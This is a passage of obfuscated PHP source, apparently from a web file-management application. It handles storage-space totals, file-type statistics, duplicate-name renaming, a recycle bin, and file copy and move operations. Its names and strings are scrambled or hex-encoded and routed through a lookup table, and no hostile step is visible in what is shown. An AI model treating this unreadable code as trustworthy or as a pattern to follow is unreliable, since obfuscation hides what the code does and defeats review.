$ÖÑğèü[$ƒ¶íä¨û][$Î•ÂãâØ[86]] += $Ğ¶Ñ§áç[$Î•ÂãâØ[86]]; } } foreach ($ÖÑğèü as $Ğ¶Ñ§áç) { $›âÑ‚Ù¾ = $this->parentLevelArray($Ğ¶Ñ§áç[$Î•ÂãâØ[561]]); foreach ($›âÑ‚Ù¾ as $ƒ¶íä¨û) { $ƒ¶íä¨û = $ƒ¶íä¨û . $Î•ÂãâØ[12]; if (!isset($ÖÑğèü[$ƒ¶íä¨û])) { continue; } if ($Ğ¶Ñ§áç[$Î•ÂãâØ[481]] == $ÖÑğèü[$ƒ¶íä¨û][$Î•ÂãâØ[481]]) { $ÖÑğèü[$ƒ¶íä¨û][$Î•ÂãâØ[86]] += $Ğ¶Ñ§áç[$Î•ÂãâØ[86]]; } } } $šíÆÉïÙ = array(); foreach ($ÖÑğèü as $Ğ¶Ñ§áç) { if ($Ğ¶Ñ§áç[$Î•ÂãâØ[86]] == $Ğ¶Ñ§áç[$Î•ÂãâØ[2195]]) { continue; } $šíÆÉïÙ[] = array($Î•ÂãâØ[191], $Ğ¶Ñ§áç[$Î•ÂãâØ[191]], $Î•ÂãâØ[86], $Ğ¶Ñ§áç[$Î•ÂãâØ[86]]); } $this->saveAll($šíÆÉïÙ); } public function userSpaceReset($÷àÃ¹© = false) { $†öê¬ =& $_SERVER[‚ûòÉ˜ş]; $·½Çæ¨„ = $this->where(array($†öê¬[188] => self::TYPE_USER, $†öê¬[546] => $÷àÃ¹©, $†öê¬[461] => 0))->sum($†öê¬[86]); $·½Çæ¨„ = !$·½Çæ¨„ || $·½Çæ¨„ <= 0 ? 0 : $·½Çæ¨„; Model($†öê¬[554])->userEdit($÷àÃ¹©, array($†öê¬[1874] => $·½Çæ¨„)); } public function targetSpaceUpdate($ÏıÈó¨‹, $é«Ö¤Îè) { $ÚƒÌØê¹ =& $_SERVER[‚ûòÉ˜ş]; if (!$é«Ö¤Îè) { return; } if (!in_array($ÏıÈó¨‹, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ëúÂ‘Œ› = $this->targetSpaceSize($ÏıÈó¨‹, $é«Ö¤Îè); if ($ÏıÈó¨‹ == self::TYPE_USER) { Model($ÚƒÌØê¹[554])->userEdit($é«Ö¤Îè, array($ÚƒÌØê¹[1874] => $ëúÂ‘Œ›)); } else { if ($ÏıÈó¨‹ == self::TYPE_GROUP) { Model($ÚƒÌØê¹[562])->groupEdit($é«Ö¤Îè, array($ÚƒÌØê¹[1874] => $ëúÂ‘Œ›)); } } } public function targetSpaceSize($¬ÈìÍ¨©, $ß¢ãÄ) { $°°¡Ô¼ê =& $_SERVER[‚ûòÉ˜ş]; $Ğš…ì§ = 0; $ÉÍÛ³Ò = $this->targetSourceRoot($¬ÈìÍ¨©, $ß¢ãÄ, !0); foreach ($ÉÍÛ³Ò as $è’¦¿œ) { if (!$è’¦¿œ) { continue; } $Ğš…ì§ += floatval($è’¦¿œ[$°°¡Ô¼ê[86]]); $ñ‹õ»Š« = array($°°¡Ô¼ê[628] => array($°°¡Ô¼ê[588], $°°¡Ô¼ê[571] . $è’¦¿œ[$°°¡Ô¼ê[191]] . $°°¡Ô¼ê[589])); $ôà€Á = Model($°°¡Ô¼ê[479])->field($°°¡Ô¼ê[467])->where($ñ‹õ»Š«)->select(); $ôà€Á = array_to_keyvalue($ôà€Á, $°°¡Ô¼ê[12], $°°¡Ô¼ê[191]); $ôà€Á = array_unique(array_filter($ôà€Á)); if ($ôà€Á) { $ñ‹õ»Š« = array($°°¡Ô¼ê[467] => array($°°¡Ô¼ê[468], $ôà€Á)); $Ğš…ì§ += floatval($this->where($ñ‹õ»Š«)->sum($°°¡Ô¼ê[86])); } } $Ğš…ì§ = !$Ğš…ì§ || $Ğš…ì§ <= 0 ? 0 : $Ğš…ì§; return $Ğš…ì§; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ˆàÛÇšÅ) { return $this->fileTypeProfile($ˆàÛÇšÅ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($…‘Ô Ÿæ) { return $this->fileTypeProfile($…‘Ô Ÿæ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($û¦Ğä÷ã, $ÇÏˆå·ñ) { $„…Ùò¶ =& $_SERVER[‚ûòÉ˜ş]; $åÆõŸ‘œ = $„…Ùò¶[2196] . $û¦Ğä÷ã . $„…Ùò¶[11] . $ÇÏˆå·ñ; $ÉïÁîâ = Cache::get($åÆõŸ‘œ); if ($ÉïÁîâ) { return $ÉïÁîâ; } $Äß’ºÇÄ = array($„…Ùò¶[622] => 0); if ($û¦Ğä÷ã != !1) { $Äß’ºÇÄ[$„…Ùò¶[546]] = $û¦Ğä÷ã; $Äß’ºÇÄ[$„…Ùò¶[188]] = $ÇÏˆå·ñ; } $âÛÕ¥Â  = array(); $âÛÕ¥Â [$„…Ùò¶[2197]] = array($„…Ùò¶[2198] => LNG($„…Ùò¶[2197]), $„…Ùò¶[2199] => $this->where($Äß’ºÇÄ)->count(), $„…Ùò¶[593] => $this->where($Äß’ºÇÄ)->sum($„…Ùò¶[86])); $Âñ‹ÔÊ = KodIO::fileTypeList(); foreach ($Âñ‹ÔÊ as $ìâ¾¼¶– => $ò’ê”») { $Äß’ºÇÄ[$„…Ùò¶[462]] = $this->fileTypeWhere($ìâ¾¼¶–); $âÛÕ¥Â [$ìâ¾¼¶–] = array($„…Ùò¶[2198] => $ò’ê”»[$„…Ùò¶[42]], $„…Ùò¶[2199] => $this->where($Äß’ºÇÄ)->count(), $„…Ùò¶[593] => $this->where($Äß’ºÇÄ)->sum($„…Ùò¶[86])); } Cache::set($åÆõŸ‘œ, $âÛÕ¥Â , 1200); return $âÛÕ¥Â ; } public function fileNameExist($«¼­ÖØé, $ËÂšåóÒ) { $…‚´„Ş† =& $_SERVER[‚ûòÉ˜ş]; $»ü§ØÓÓ = $this->field($…‚´„Ş†[2200])->where(array($…‚´„Ş†[190] => $«¼­ÖØé, $…‚´„Ş†[42] => $ËÂšåóÒ, $…‚´„Ş†[481] => 0))->find(); return is_array($»ü§ØÓÓ) ? $»ü§ØÓÓ[$…‚´„Ş†[191]] : !1; } public function childList($Ïˆ˜ºÆê) { $²”˜ =& $_SERVER[‚ûòÉ˜ş]; $ËõÒ›İÈ = $²”˜[2173] . $Ïˆ˜ºÆê; if (isset(self::$cacheChildList[$ËõÒ›İÈ])) { return self::$cacheChildList[$ËõÒ›İÈ]; } $şˆÚú·Á = array($²”˜[190] => intval($Ïˆ˜ºÆê), $²”˜[481] => 0); $óãê¾ÒÒ = $this->where($şˆÚú·Á)->select(); $óãê¾ÒÒ = $óãê¾ÒÒ ? $óãê¾ÒÒ : array(); self::$cacheChildList[$ËõÒ›İÈ] = $óãê¾ÒÒ; foreach ($óãê¾ÒÒ as $³øû·Î) { $ËõÒ›İÈ = $²”˜[509] . $³øû·Î[$²”˜[191]]; self::$cacheSourceInfo[$ËõÒ›İÈ] = $³øû·Î; } return $óãê¾ÒÒ; } public function fileNameAuto($Á»›Ì…Ğ, $Êê‚¿·½, $ù„¦¹…ä = REPEAT_RENAME, $ÍÒ‚ñÔ = false) { $¨—áï”¤ =& $_SERVER[‚ûòÉ˜ş]; $º¹öòç« = get_path_ext($Êê‚¿·½); $ôĞœŠ·İ = $º¹öòç« ? basename($Êê‚¿·½, $¨—áï”¤[10] . $º¹öòç«) . $¨—áï”¤[2201] . $º¹öòç« : $Êê‚¿·½ . $¨—áï”¤[436]; $ÂÑÏ‘¥‚ = array($¨—áï”¤[190] => $Á»›Ì…Ğ, $¨—áï”¤[481] => 0, $¨—áï”¤[42] => array($¨—áï”¤[435], $ôĞœŠ·İ)); $ÇİÇ¸Ôó = $this->field($¨—áï”¤[42])->where($ÂÑÏ‘¥‚)->select(); $Ã£‡‘÷ë = array_to_keyvalue($ÇİÇ¸Ôó, $¨—áï”¤[12], $¨—áï”¤[42]); return $this->fileNameAutoGet($Ã£‡‘÷ë, $Êê‚¿·½, $ù„¦¹…ä, $ÍÒ‚ñÔ); } public function fileNameAutoGet($ÚçÊĞò¶, $“õıÒ³Ô, $ÏÀööü®, $§Ê‹øÈğ) { $õ°§Ì =& $_SERVER[‚ûòÉ˜ş]; if ($ÏÀööü® == REPEAT_REPLACE || !$ÚçÊĞò¶ || !in_array_not_case($“õıÒ³Ô, $ÚçÊĞò¶) || $§Ê‹øÈğ && $ÏÀööü® != REPEAT_RENAME_FOLDER) { return $“õıÒ³Ô; } if ($ÏÀööü® == REPEAT_SKIP) { return !1; } $¢õÇÈÉë = $õ°§Ì[10] . get_path_ext($“õıÒ³Ô); $¢õÇÈÉë = $¢õÇÈÉë == $õ°§Ì[10] || $§Ê‹øÈğ ? $õ°§Ì[12] : $¢õÇÈÉë; for ($é™›½ü = 1; $é™›½ü <= count($ÚçÊĞò¶) + 1; $é™›½ü++) { $ÂÑ±ÍĞ­ = substr($“õıÒ³Ô, 0, strlen($“õıÒ³Ô) - strlen($¢õÇÈÉë)); $ø»¨…ß— = $ÂÑ±ÍĞ­ . "\x28{$é™›½ü}\x29{$¢õÇÈÉë}"; if (!in_array_not_case($ø»¨…ß—, $ÚçÊĞò¶)) { return $ø»¨…ß—; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\x72\x63\x65\x5f\162\x65\x63\171\x63\154\145"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\x69\x6d\145", "\164\151\x6d\145", "\x69\156\163\x65\162\164", "\146\165\156\x63\x74\x69\x6f\156")); public function listData($ãîæòªÀ = false) { $¸±¡öÔ„ =& $_SERVER[‚ûòÉ˜ş]; $ãîæòªÀ = $ãîæòªÀ ? $ãîæòªÀ : USER_ID; $Îù…ºàº = $this->where(array($¸±¡öÔ„[1678] => $ãîæòªÀ))->select(); return array_to_keyvalue($Îù…ºàº, $¸±¡öÔ„[12], $¸±¡öÔ„[191]); } public function moveToRecycle($µÎú¤À) { $¡İæ¹Ğş =& $_SERVER[‚ûòÉ˜ş]; $Ì·Ÿ­µ° = Model($¡İæ¹Ğş[1373]); $ıºå›ğÎ = $Ì·Ÿ­µ°->sourceInfo($µÎú¤À); if (!$ıºå›ğÎ || $ıºå›ğÎ[$¡İæ¹Ğş[481]] == $¡İæ¹Ğş[98]) { return; } $‡‹ø·ï = array($¡İæ¹Ğş[467] => $µÎú¤À, $¡İæ¹Ğş[1678] => USER_ID, $¡İæ¹Ğş[624] => $ıºå›ğÎ[$¡İæ¹Ğş[188]], $¡İæ¹Ğş[625] => $ıºå›ğÎ[$¡İæ¹Ğş[546]], $¡İæ¹Ğş[628] => $ıºå›ğÎ[$¡İæ¹Ğş[561]]); $this->add($‡‹ø·ï); $this->recycleMove($µÎú¤À, 1); if ($ıºå›ğÎ[$¡İæ¹Ğş[461]] == $¡İæ¹Ğş[98]) { $÷ôê×øİ = array($¡İæ¹Ğş[628] => array($¡İæ¹Ğş[588], $ıºå›ğÎ[$¡İæ¹Ğş[561]] . $µÎú¤À . $¡İæ¹Ğş[589])); $Ì·Ÿ­µ°->where($÷ôê×øİ)->setField($¡İæ¹Ğş[481], 1); } } public function clear() { $this->remove(!1); } public function remove($ŞÁ¸ëÊè = false, $ƒ²×ã” = false) { $“ã¶ëò‘ =& $_SERVER[‚ûòÉ˜ş]; $ƒ²×ã” = $ƒ²×ã” ? $ƒ²×ã” : USER_ID; $İé‡“çï = Model($“ã¶ëò‘[1373]); $È³€¹¬¯ = $this->listData($ƒ²×ã”); $ŞÁ¸ëÊè = $ŞÁ¸ëÊè === !1 ? !1 : $ŞÁ¸ëÊè; $Æ°»Åê° = array(); foreach ($È³€¹¬¯ as $îˆğ¡¦) { if ($ŞÁ¸ëÊè != !1 && !in_array($îˆğ¡¦, $ŞÁ¸ëÊè)) { continue; } $™Éä®„ë = $İé‡“çï->sourceInfo($îˆğ¡¦); $İé‡“çï->remove($îˆğ¡¦, !1); $ğÔ—ı’é = $™Éä®„ë[$“ã¶ëò‘[188]] . $“ã¶ëò‘[11] . $™Éä®„ë[$“ã¶ëò‘[546]]; $Æ°»Åê°[$ğÔ—ı’é] = array($“ã¶ëò‘[624] => $™Éä®„ë[$“ã¶ëò‘[188]], $“ã¶ëò‘[546] => $™Éä®„ë[$“ã¶ëò‘[546]]); $this->where(array($“ã¶ëò‘[191] => $îˆğ¡¦))->delete(); } foreach ($Æ°»Åê° as $ÊÁ‡Œì) { $İé‡“çï->targetSpaceUpdate($ÊÁ‡Œì[$“ã¶ëò‘[188]], $ÊÁ‡Œì[$“ã¶ëò‘[546]]); } } public function restore($ß±°“œ = false) { $Ñª™¾Ù® = $this->listData(); $this->_restoreSource($Ñª™¾Ù®, $ß±°“œ); } public function removeUserAll($ÆÒÊ¬é¼) { $this->remove(!1, $ÆÒÊ¬é¼); } public function restoreItem($ŸƒƒÌÖ„) { $this->_restoreSource(array($ŸƒƒÌÖ„), array($ŸƒƒÌÖ„)); } private function _restoreSource($Œè‘Üï÷, $¾î²­Ûò) { $®¶Ã¢¢ƒ =& $_SERVER[‚ûòÉ˜ş]; $ïô¸œ–¬ = Model($®¶Ã¢¢ƒ[1373]); $¾î²­Ûò = $¾î²­Ûò == !1 ? !1 : $¾î²­Ûò; if (!$Œè‘Üï÷) { return !0; } $Ñšá’ªš = array(); foreach ($Œè‘Üï÷ as $ğŠôı³) { if ($¾î²­Ûò != !1 && !in_array($ğŠôı³, $¾î²­Ûò)) { continue; } $æŞÊ âö = $ïô¸œ–¬->sourceInfo($ğŠôı³); $Û¸áÜÛ» = $ïô¸œ–¬->sourceInfo($æŞÊ âö[$®¶Ã¢¢ƒ[190]]); if ($Û¸áÜÛ»[$®¶Ã¢¢ƒ[481]] == $®¶Ã¢¢ƒ[98]) { continue; } $ïô¸œ–¬->lockMoveStart($ğŠôı³); $this->recycleMove($ğŠôı³, 0); if ($æŞÊ âö[$®¶Ã¢¢ƒ[461]] == $®¶Ã¢¢ƒ[98]) { $šş» ÚÌ = array($®¶Ã¢¢ƒ[628] => array($®¶Ã¢¢ƒ[588], $æŞÊ âö[$®¶Ã¢¢ƒ[561]] . $ğŠôı³ . $®¶Ã¢¢ƒ[589])); $ïô¸œ–¬->where($šş» ÚÌ)->setField($®¶Ã¢¢ƒ[481], 0); $this->restoreFolderChildren($ğŠôı³, $Œè‘Üï÷); } $this->where(array($®¶Ã¢¢ƒ[191] => $ğŠôı³))->delete(); $ïô¸œ–¬->folderSizeReset($æŞÊ âö[$®¶Ã¢¢ƒ[190]]); $Ñšá’ªš[] = $æŞÊ âö[$®¶Ã¢¢ƒ[190]]; if ($æŞÊ âö[$®¶Ã¢¢ƒ[461]] == $®¶Ã¢¢ƒ[98]) { $Ñšá’ªš[] = $ğŠôı³; } $ïô¸œ–¬->lockMoveEnd($ğŠôı³); } $ïô¸œ–¬->updateModifyTime($Ñšá’ªš); } private function restoreFolderChildren($ŠÉËİâ‹, $ÑáÈ¹°ú) { $®ûÌ–ø =& $_SERVER[‚ûòÉ˜ş]; $Ó“Åºô = Model($®ûÌ–ø[1373]); $Ü±şªÚŞ = array($®ûÌ–ø[191] => array($®ûÌ–ø[7], array())); foreach ($ÑáÈ¹°ú as $åÍê¨¤ú) { if ($åÍê¨¤ú == $ŠÉËİâ‹) { continue; } if (!$Ó“Åºô->isParentOf($ŠÉËİâ‹, $åÍê¨¤ú)) { continue; } $¢›Ğì‘º = $Ó“Åºô->sourceInfo($åÍê¨¤ú); if ($¢›Ğì‘º[$®ûÌ–ø[461]] == $®ûÌ–ø[98]) { $Ü±şªÚŞ[] = array($®ûÌ–ø[628] => array($®ûÌ–ø[588], $¢›Ğì‘º[$®ûÌ–ø[561]] . $åÍê¨¤ú . $®ûÌ–ø[589])); } else { $Ü±şªÚŞ[$®ûÌ–ø[191]][1][] = $åÍê¨¤ú; } } if (!$Ü±şªÚŞ[$®ûÌ–ø[191]][1]) { unset($Ü±şªÚŞ[$®ûÌ–ø[191]]); } if (!$Ü±şªÚŞ) { return; } if (is_array($Ü±şªÚŞ[$®ûÌ–ø[191]]) && is_array($Ü±şªÚŞ[$®ûÌ–ø[191]][1])) { $Ü±şªÚŞ[$®ûÌ–ø[191]][1] = array_unique($Ü±şªÚŞ[$®ûÌ–ø[191]][1]); } $Ü±şªÚŞ[$®ûÌ–ø[1041]] = $®ûÌ–ø[1983]; $Ó“Åºô->where($Ü±şªÚŞ)->setField($®ûÌ–ø[481], 1); } private function recycleMove($™€†°³, $ŸõÌ º = 1) { $ßš¡É½ =& $_SERVER[‚ûòÉ˜ş]; $í”ÕŒ‹Í = Model($ßš¡É½[1373]); $•ú ’åû = Model($ßš¡É½[2202]); $ïûğšß¢ = array($ßš¡É½[191] => $™€†°³); if ($ŸõÌ º) { $í”ÕŒ‹Í->where($ïûğšß¢)->setField($ßš¡É½[481], 1); $•ú ’åû->eventRecycle($™€†°³, $ßš¡É½[2203]); } else { $Öˆä²ßş = $í”ÕŒ‹Í->where($ïûğšß¢)->find(); $‡Ãüåøé = $Öˆä²ßş[$ßš¡É½[461]] == $ßš¡É½[98]; $ óùá·º = $í”ÕŒ‹Í->fileNameAuto($Öˆä²ßş[$ßš¡É½[190]], $Öˆä²ßş[$ßš¡É½[42]], REPEAT_RENAME_FOLDER, $‡Ãüåøé); if ($ óùá·º != $Öˆä²ßş[$ßš¡É½[42]]) { $í”ÕŒ‹Í->rename($™€†°³, $ óùá·º); } $í”ÕŒ‹Í->where($ïûğšß¢)->setField($ßš¡É½[481], 0); $•ú ’åû->eventRecycle($™€†°³, $ßš¡É½[2204]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\163\x6f\165\x72\x63\x65\123\x65\143\x72\145\164\x4c\x69\163\x74"; public $field = array("\163\157\x75\x72\143\x65\x49\x44", "\164\171\160\x65\111\x44", "\x63\x72\145\x61\164\145\x55\163\145\162"); } goto BÚÅ ¶Íéø; d’Øâ‡‹´ã: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($×è±‡†º, $˜œ’ ºÅ) { $’•ŸÚıã =& $_SERVER[‚ûòÉ˜ş]; $¶ ¯ÔäÌ = $˜œ’ ºÅ; $GLOBALS[$’•ŸÚıã[1187]] = $’•ŸÚıã[1188] . $×è±‡†º; Hook::trigger($’•ŸÚıã[1188] . $×è±‡†º . $’•ŸÚıã[1189], $¶ ¯ÔäÌ); $ê€ûâøš = self::driverMake($˜œ’ ºÅ[0]); if (!$ê€ûâøš) { return !1; } if (method_exists($ê€ûâøš, $×è±‡†º)) { $ö‚«§ = @call_user_func_array(array($ê€ûâøš, $×è±‡†º), $˜œ’ ºÅ); } else { if (method_exists($ê€ûâøš, $’•ŸÚıã[1190])) { $ö‚«§ = @call_user_func_array(array($ê€ûâøš, $×è±‡†º), $˜œ’ ºÅ); } else { if (method_exists(self, $×è±‡†º)) { $ö‚«§ = @call_user_func_array(array(self, $×è±‡†º), $˜œ’ ºÅ); } else { $ö‚«§ = call_user_func_array(array(parent, $×è±‡†º), $˜œ’ ºÅ); } } } Hook::trigger($’•ŸÚıã[1188] . $×è±‡†º . $’•ŸÚıã[1191], $¶ ¯ÔäÌ, $ö‚«§); return $ö‚«§; } public static function init($ÛšÈ¼å) { return self::driverMake($ÛšÈ¼å); } public static function copy($ÂôÇÆİ, $öì±ÈÒ®, $û‹êõßŸ = false, $Íğ³ë¥ = false) { return self::copyMoveStart($ÂôÇÆİ, $öì±ÈÒ®, $û‹êõßŸ, $_SERVER[‚ûòÉ˜ş][594], $Íğ³ë¥); } public static function move($ÜâïÃ´, $¶‚Õö—, $¿ÄïÜã¸ = false, $ö¯âçÛ– = false) { return self::copyMoveStart($ÜâïÃ´, $¶‚Õö—, $¿ÄïÜã¸, $_SERVER[‚ûòÉ˜ş][596], $ö¯âçÛ–); } private static function copyMoveStart($Ì«âßÜ¹, $Şõùüõ, $¤®•ºîÁ, $õ £å”ˆ, $Ù½¢Ôà) { $®·ğ¨ğØ =& $_SERVER[‚ûòÉ˜ş]; $±Ì’ó¬â = array($Ì«âßÜ¹, $Şõùüõ, $¤®•ºîÁ, $Ù½¢Ôà); Hook::trigger($®·ğ¨ğØ[1188] . $õ £å”ˆ . $®·ğ¨ğØ[1189], $±Ì’ó¬â); $ƒãÎèŠ€ = self::copyMove($Ì«âßÜ¹, $Şõùüõ, $¤®•ºîÁ, $õ £å”ˆ, $Ù½¢Ôà); Hook::trigger($®·ğ¨ğØ[1188] . $õ £å”ˆ . $®·ğ¨ğØ[1191], $±Ì’ó¬â, $ƒãÎèŠ€); return $ƒãÎèŠ€; } public static function saveFile($ööÜ©¥à, $Âº·¢„Ü, $ğ–¤”Ëö = true) { $–¢úÅÉ =& $_SERVER[‚ûòÉ˜ş]; $³ÔÉÄ¨ï = self::info($Âº·¢„Ü); $œğ»Ù—Á = self::driverMake($ööÜ©¥à); $Ö—Ó´»á = self::driverMake($Âº·¢„Ü); $¼öñ¯‘Ì = !1; if ($Ö—Ó´»á->pathParse[$–¢úÅÉ[1192]]) { $¼öñ¯‘Ì = $Ö—Ó´»á; $ùÂ±üõİ = $Ö—Ó´»á->pathParse[$–¢úÅÉ[1192]]; $Ö—Ó´»á = self::driverMake($ùÂ±üõİ); } if ($œğ»Ù—Á->pathParse[$–¢úÅÉ[1192]]) { $ÇúÍ…ªâ = $œğ»Ù—Á->pathParse[$–¢úÅÉ[1192]]; $œğ»Ù—Á = self::driverMake($ÇúÍ…ªâ); } $·şõ¨ = $Ö—Ó´»á->pathFather($Âº·¢„Ü); $´ûáÀŸ = !0; if (!$ğ–¤”Ëö && self::driverIsSame($œğ»Ù—Á, $Ö—Ó´»á)) { $´ûáÀŸ = !1; } $ø÷ÔßÎã = self::copyFile($œğ»Ù—Á, $ööÜ©¥à, $Ö—Ó´»á, $·şõ¨, $³ÔÉÄ¨ï[$–¢úÅÉ[42]], $´ûáÀŸ); if ($¼öñ¯‘Ì) { $ø÷ÔßÎã = $¼öñ¯‘Ì->getPathOuter($ø÷ÔßÎã); } return $ø÷ÔßÎã; } private static function copyMove($âİ…ıÀ‹, $Ä°ˆî€­, $¾æ¿œê, $íòÇ¹·, $Ñ¦“÷ò = false) { $ï¼Çë¬ =& $_SERVER[‚ûòÉ˜ş]; if (!$âİ…ıÀ‹ || $âİ…ıÀ‹ == $ï¼Çë¬[8] || !$Ä°ˆî€­) { return !1; } ignore_timeout(); $°¡®ÑÏÓ = self::driverMake($âİ…ıÀ‹); $é£¡‰Ë = self::driverMake($Ä°ˆî€­); $ïåâİ‹ã = $íòÇ¹· == $ï¼Çë¬[596]; $çèìØ‘‰ = !1; if ($é£¡‰Ë->pathParse[$ï¼Çë¬[1192]]) { $çèìØ‘‰ = $é£¡‰Ë; $Ä°ˆî€­ = $é£¡‰Ë->pathParse[$ï¼Çë¬[1192]]; $é£¡‰Ë = self::driverMake($Ä°ˆî€­); } if ($°¡®ÑÏÓ->pathParse[$ï¼Çë¬[1192]]) { $âİ…ıÀ‹ = $°¡®ÑÏÓ->pathParse[$ï¼Çë¬[1192]]; $°¡®ÑÏÓ = self::driverMake($âİ…ıÀ‹); } self::check($°¡®ÑÏÓ, $âİ…ıÀ‹, $é£¡‰Ë, $Ä°ˆî€­); Hook::trigger($ï¼Çë¬[1193], $°¡®ÑÏÓ, $âİ…ıÀ‹, $é£¡‰Ë, $Ä°ˆî€­); $şÀ«†ĞÔ = self::driverIsSame($°¡®ÑÏÓ, $é£¡‰Ë); if ($şÀ«†ĞÔ) { if ($íòÇ¹· == $ï¼Çë¬[596] && !method_exists($é£¡‰Ë, $ï¼Çë¬[1194]) && trim($Ä°ˆî€­, $ï¼Çë¬[8]) == trim($é£¡‰Ë->pathFather($âİ…ıÀ‹), $ï¼Çë¬[8])) { if ($°¡®ÑÏÓ->pathThis($âİ…ıÀ‹) != $Ñ¦“÷ò && !$°¡®ÑÏÓ->isTypeObject()) { return $°¡®ÑÏÓ->rename($âİ…ıÀ‹, $Ñ¦“÷ò); } return $é£¡‰Ë->getPathOuter($âİ…ıÀ‹); } if (method_exists($é£¡‰Ë, $íòÇ¹·)) { return $é£¡‰Ë->{$íòÇ¹·}($âİ…ıÀ‹, $Ä°ˆî€­, $¾æ¿œê, $Ñ¦“÷ò); } } if ($şÀ«†ĞÔ && $íòÇ¹· == $ï¼Çë¬[596] && $é£¡‰Ë->getType() == $ï¼Çë¬[116]) { $ÅıÆçÓ“ = $é£¡‰Ë->movePath($âİ…ıÀ‹, $Ä°ˆî€­, $Ñ¦“÷ò); if ($ÅıÆçÓ“) { return $ÅıÆçÓ“; } } $Š’ƒıëç = $°¡®ÑÏÓ->isFile($âİ…ıÀ‹); if (!$Š’ƒıëç && $é£¡‰Ë->getType() == $ï¼Çë¬[797] && $°¡®ÑÏÓ->getType() == $ï¼Çë¬[116]) { $ÅıÆçÓ“ = $é£¡‰Ë->copyFolderFromIO($°¡®ÑÏÓ, $âİ…ıÀ‹, $Ä°ˆî€­, $¾æ¿œê, $ïåâİ‹ã, $Ñ¦“÷ò); } else { $ÅıÆçÓ“ = self::copyPath($°¡®ÑÏÓ, $âİ…ıÀ‹, $é£¡‰Ë, $Ä°ˆî€­, $¾æ¿œê, $ïåâİ‹ã, $Š’ƒıëç, $Ñ¦“÷ò); } if ($ÅıÆçÓ“ && $ïåâİ‹ã) { $°¡®ÑÏÓ->remove($âİ…ıÀ‹); } if ($çèìØ‘‰) { $ÅıÆçÓ“ = $çèìØ‘‰->getPathOuter($ÅıÆçÓ“); } return $ÅıÆçÓ“; } private static function check($‡Ë§ÆÑ™, $Ê§ÅÍÍî, $¤û´çª, &$¬ú®Ø€Ã) { $å²Â×ï¿ =& $_SERVER[‚ûòÉ˜ş]; if (self::driverIsSame($‡Ë§ÆÑ™, $¤û´çª) && $‡Ë§ÆÑ™->isFolder($Ê§ÅÍÍî) && $‡Ë§ÆÑ™->isParentOf($Ê§ÅÍÍî, $¬ú®Ø€Ã)) { show_json(LNG($å²Â×ï¿[1195]), !1); } if (!$‡Ë§ÆÑ™->exist($Ê§ÅÍÍî)) { show_json(LNG($å²Â×ï¿[115]), !1); } } private static function copyPath($Ù†É÷›œ, $¨ø¾üçÃ, $úÈ¶ƒàÃ, $¶ææÖ€», $ò‹¹âó, $‰ûÉ£ÙŞ, $ËÉ²Ä´, $‘çòŒêì = false, $İßş°¤ = true) { $×¨‰ß£¢ =& $_SERVER[‚ûòÉ˜ş]; $á¾ÃóçÛ = empty($‘çòŒêì) && $‘çòŒêì !== $×¨‰ß£¢[222] ? $Ù†É÷›œ->pathThis($¨ø¾üçÃ) : $‘çòŒêì; if ($ò‹¹âó) { $ªŸ«³¨ = $úÈ¶ƒàÃ->fileNameExist($¶ææÖ€», $á¾ÃóçÛ); $¡î™óŠ = $á¾ÃóçÛ; $á¾ÃóçÛ = $úÈ¶ƒàÃ->fileNameAuto($¶ææÖ€», $á¾ÃóçÛ, $ò‹¹âó, !$ËÉ²Ä´); if (!$ªŸ«³¨ || $¡î™óŠ != $á¾ÃóçÛ) { $ò‹¹âó = !1; } if ($İßş°¤ && !$ò‹¹âó) { $úÈ¶ƒàÃ->_data[$×¨‰ß£¢[1196]] = !0; } } if ($ËÉ²Ä´) { return self::copyFile($Ù†É÷›œ, $¨ø¾üçÃ, $úÈ¶ƒàÃ, $¶ææÖ€», $á¾ÃóçÛ, $‰ûÉ£ÙŞ); } if ($ò‹¹âó == REPEAT_RENAME_FOLDER) { $ò‹¹âó = !1; } $Ø½ıíÁ· = rtrim($¶ææÖ€», $×¨‰ß£¢[8]) . $×¨‰ß£¢[8] . $á¾ÃóçÛ; $“‚¢Ÿãú = $úÈ¶ƒàÃ->mkdir($úÈ¶ƒàÃ->getPath($Ø½ıíÁ·), $ò‹¹âó); $¶ææÖ€» = $úÈ¶ƒàÃ->getPathInner($“‚¢Ÿãú); $„»¤èº„ = $Ù†É÷›œ->listPath($¨ø¾üçÃ, !0); $„»¤èº„ = is_array($„»¤èº„) ? $„»¤èº„ : array($×¨‰ß£¢[93] => array(), $×¨‰ß£¢[92] => array()); $ûš·¸ïë = array_merge($„»¤èº„[$×¨‰ß£¢[93]], $„»¤èº„[$×¨‰ß£¢[92]]); foreach ($ûš·¸ïë as $‹À÷ş’ï) { $Á¿¯µîÛ = $‹À÷ş’ï[$×¨‰ß£¢[43]] == $×¨‰ß£¢[224]; $¨ø¾üçÃ = $Ù†É÷›œ->getPathInner($‹À÷ş’ï[$×¨‰ß£¢[94]]); $Ùüë§üà = self::copyPath($Ù†É÷›œ, $¨ø¾üçÃ, $úÈ¶ƒàÃ, $¶ææÖ€», $ò‹¹âó, $‰ûÉ£ÙŞ, $Á¿¯µîÛ, !1, !1); if (!$Ùüë§üà) { IO::errorTips($×¨‰ß£¢[1197] . $¨ø¾üçÃ . $×¨‰ß£¢[80] . $¶ææÖ€»); } } self::copyMoveKeepInfo($Ù†É÷›œ, $¨ø¾üçÃ, $“‚¢Ÿãú); return $“‚¢Ÿãú; } private static function copyFile($¯Œ¯¯¸ƒ, $¬ú›èæ, $êööÉ—, $Š­†£§‚, $˜ŒÔ˜î°, $‚€ÎŸ‘İ) { $ªî€»âö =& $_SERVER[‚ûòÉ˜ş]; $Š­†£§‚ = $êööÉ—->getPath(rtrim($Š­†£§‚, $ªî€»âö[8]) . $ªî€»âö[8] . $˜ŒÔ˜î°); $·€èã±† = $ªî€»âö[1198] . time() . rand_string(5); Hook::trigger($ªî€»âö[1199], $¯Œ¯¯¸ƒ, $¬ú›èæ, $êööÉ—, $Š­†£§‚, $˜ŒÔ˜î°, $·€èã±†); if 